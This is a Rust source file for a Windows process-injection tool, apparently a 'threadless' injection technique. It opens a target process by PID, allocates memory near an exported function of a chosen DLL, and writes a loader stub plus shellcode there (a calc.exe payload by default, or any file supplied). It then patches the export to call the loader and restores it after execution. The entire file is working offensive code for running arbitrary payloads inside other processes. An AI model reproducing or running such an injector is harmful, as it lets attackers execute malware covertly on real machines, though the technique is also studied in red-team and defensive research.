use windows::Win32::Foundation::HANDLE;
use windows::Win32::System::{LibraryLoader, Threading};
use windows::core::{PCSTR};
use std::ffi::c_void;
use std::path::Path;

use std::io;
use std::io::Read;
use std::io::BufReader;
use std::fs::File;

use clap::Parser;

use std::time::Instant;
use memory;
use remote_modules;

#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// Target process ID to inject
    #[arg(short, long)]
    pid: u32,

    /// Path for x64 shellcode paylod (default calc payload will be used if not specified)
    #[arg(short, long)]
    shellcode_file: Option<String>,

    /// DLL that contains the export to patch (must be KnownDLL)
    #[arg(short, long)]
    dll: String,
       
    /// Exported function that will be hijacked
    #[arg(short, long)]
    export: String,
} 

fn main() -> Result<(), String> {
      
        //   start:
        //     0:  58                      pop    rax
        //     1:  48 83 e8 05             sub    rax,0x5
        //     5:  50                      push   rax
        //     6:  51                      push   rcx
        //     7:  52                      push   rdx
        //     8:  41 50                   push   r8
        //     a:  41 51                   push   r9
        //     c:  41 52                   push   r10
        //     e:  41 53                   push   r11
        //     10: 48 b9 88 77 66 55 44    movabs rcx,0x1122334455667788
        //     17: 33 22 11
        //     1a: 48 89 08                mov    QWORD PTR [rax],rcx
        //     1d: 48 83 ec 40             sub    rsp,0x40
        //     21: e8 11 00 00 00          call   shellcode
        //     26: 48 83 c4 40             add    rsp,0x40
        //     2a: 41 5b                   pop    r11
        //     2c: 41 5a                   pop    r10
        //     2e: 41 59                   pop    r9
        //     30: 41 58                   pop    r8
        //     32: 5a                      pop    rdx
        //     33: 59                      pop    rcx
        //     34: 58                      pop    rax
        //     35: ff e0                   jmp    rax
        //   shellcode:
    let mut payload: Vec<u8> = vec![0x58, 0x48, 0x83, 0xE8, 0x05, 0x50, 0x51, 0x52, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0x48, 0xB9,
    0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11, 0x48, 0x89, 0x08, 0x48, 0x83, 0xEC, 0x40, 0xE8, 0x11, 0x00,
    0x00, 0x00, 0x48, 0x83, 0xC4, 0x40, 0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 0x5A, 0x59, 0x58, 0xFF,
    0xE0, 0x90];

    let calc: Vec<u8> = vec![0x53, 0x56, 0x57, 0x55, 0x54, 0x58, 0x66, 0x83, 0xE4, 0xF0, 0x50, 0x6A,
    0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x29, 0xD4,
    0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10,
    0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C,
    0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B,
    0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81,
    0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C,
    0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7,
    0x48, 0x83, 0xC4, 0x68, 0x5C, 0x5D, 0x5F, 0x5E, 0x5B, 0xC3];

    let args = Args::parse();

    let mut shellcode = match args.shellcode_file {
        None => {println!("[*] No shellcode provided using default calc.exe shellcode");
                calc
        },
        Some(x) => 
            match read_file(&x){
                Ok(x) => x,
                Err(_) => return Err("Error reading shellcode file".into())
            }
    };
    
    unsafe{
    
    // let hmodule = match LibraryLoader::GetModuleHandleA(PCSTR(format!("{}\0", &args.dll).as_mut_ptr())){
    //     Ok(x) => x,
    //     Err(_) => return Err(format!("Failed to open handle to DLL {}", &args.dll))
    // };
    
    // let export_address: usize = match LibraryLoader::GetProcAddress(hmodule, PCSTR(format!("{}\0", &args.export).as_mut_ptr())){
    //     Some(x) =>  std::mem::transmute::<unsafe extern "system" fn() -> isize, usize>(x),
    //     None => return Err(format!("Failed to find export {} in dll {}", &args.export, &args.dll)),
    // };

    let target_process_handle = match Threading::OpenProcess(Threading::PROCESS_ALL_ACCESS, false, args.pid){
        Ok(x) => x,
        Err(_) => return Err(format!("Failed to get handle to handle to pid {}", &args.pid))
    };

    println!("[*] Opened process with pid {}", &args.pid);

    let hmodule = remote_modules::get_remote_module_handle(target_process_handle, args.dll.clone()).unwrap();
    let export_address = remote_modules::get_remote_proc_address(target_process_handle, hmodule, args.export.clone(), 0, false).unwrap();

    println!("[*] Found {}!{} at @{:x}", &args.dll, &args.export, export_address);

    
    let loader_address = match find_memory_hole(target_process_handle, export_address, shellcode.len() + payload.len()){
        Ok(x) => x,
        Err(_) => return Err("Failed to find memory hole".into()),
    };
    
    println!("[*] Allocated loader and shellcode at @{:x} in pid {}", loader_address, &args.pid);

    let mut original_bytes: [u8; 8] = [0;8];
    let ret = memory::read_virtual_memory(target_process_handle, export_address, original_bytes.as_mut_ptr() as *mut c_void, original_bytes.len());
    if !(ret.unwrap()) >= 0{
        return Err("Error reading original bytes from export address".into());
    }

    payload.splice(18..18+original_bytes.len(), original_bytes.iter().cloned());
    payload.append(&mut shellcode);
    let relative_loader_address = (loader_address as i64 - (export_address as i64 + 5)) as i32;
    
    let mut call_opcode: Vec<u8> = vec![0xe8, 0, 0, 0, 0];
    call_opcode.splice(1..1+relative_loader_address.to_le_bytes().len(), relative_loader_address.to_le_bytes().iter().cloned());

    // Patch Export Address
    let size = 8;
    let mut old_protect = 0 as u32;
    let status = memory::protect_virtual_memory(target_process_handle, export_address as usize, size, 0x40, &mut old_protect);
    if !(status.unwrap()) >= 0{
        return Err("Error changing export function address to RWX".into());
    }
    let mut bytes_written: usize = 0;
    let status = memory::write_virtual_memory(target_process_handle, export_address as usize, call_opcode.as_mut_ptr() as *mut c_void, call_opcode.len(), &mut bytes_written);
    if !(status.unwrap()) >= 0{
        return Err("Error writing patch to export function address".into());
    }
    println!("[*] Patched {}!{}", &args.dll, &args.export);


    // Write payload to loader adddress
    let status = memory::protect_virtual_memory(target_process_handle, loader_address as usize, payload.len(), 0x04, &mut old_protect);
    if !(status.unwrap()) >= 0{
        return Err("Error changing loader address to RW".into());
    }

    let status = memory::write_virtual_memory(target_process_handle, loader_address as usize, payload.as_mut_ptr() as *mut c_void, payload.len(), &mut bytes_written);
    if !(status.unwrap()) >= 0{
        return Err("Error writing payload to loader address".into());
    }

    let status = memory::protect_virtual_memory(target_process_handle, loader_address as usize, payload.len(), old_protect, &mut old_protect);
    if !(status.unwrap()) >= 0{
        return Err("Error reverting loader address to orginal protect".into());
    }

    println!("[*] Shellcode injected, waiting 60 seconds for hook to be called");


    let mut export_address_bytes: [u8; 8] = [0;8];
    let mut executed = false;
    let start = Instant::now();
    while start.elapsed().as_secs() < 60 && executed != true {
        let ret = memory::read_virtual_memory(target_process_handle, export_address, export_address_bytes.as_mut_ptr() as *mut c_void, export_address_bytes.len());
        if !(ret.unwrap() >= 0){
            return Err("Error cleaning up export address".into());
        }
        if export_address_bytes == original_bytes{
            executed = true;
        }
        std::thread::sleep(std::time::Duration::from_secs(1));
    }

    if executed == true {
        let ret = memory::protect_virtual_memory(target_process_handle, export_address, export_address_bytes.len(), 0x20, &mut old_protect);
        if !(ret.unwrap() >= 0){
            return Err("Error cleaning up export address".into());
        }

        let ret = memory::free_virtual_memory(target_process_handle, loader_address);
        if !(ret.unwrap() >= 0){
            return Err("Error freeing up shellcode memoory".into());
        }

        println!("[*] Shellcode executed, export restored");
    }
    else{
        println!("[*] Shellcode did not execute within 60s, it may still execute but we are not cleaning up");
    }

    windows::Win32::Foundation::CloseHandle(target_process_handle);
   }

   Ok(())
}

unsafe fn find_memory_hole(h_process: HANDLE, export_address: usize, size: usize) -> Result<usize, &'static str>{
    
    let mut ret: Option<i32>;   

    let mut loader_address: usize = 0;
    let mut remote_loader_address = (export_address & 0xFFFFFFFFFFF70000) - 0x70000000;
    
    while remote_loader_address < export_address + 0x70000000{
        ret = memory::allocate_virtual_memory(h_process, remote_loader_address, size);
        if ret.unwrap() != 0{
            remote_loader_address = remote_loader_address  + 0x10000; 
        }else{
            loader_address = remote_loader_address as usize;
            break;
        }
    }

    match loader_address{
        0 => Err("Could not find memory hole"),
        _ => Ok(loader_address)
    }

}

fn read_file(shellcode_file: &String) -> io::Result<Vec<u8>>{
    let f = File::open(Path::new(shellcode_file)).or_else(|e| Err(e))?;

    let mut reader = BufReader::new(f);
    let mut buffer = Vec::new();
    
    // Read file into vector
    reader.read_to_end(&mut buffer)?;

    Ok(buffer)

}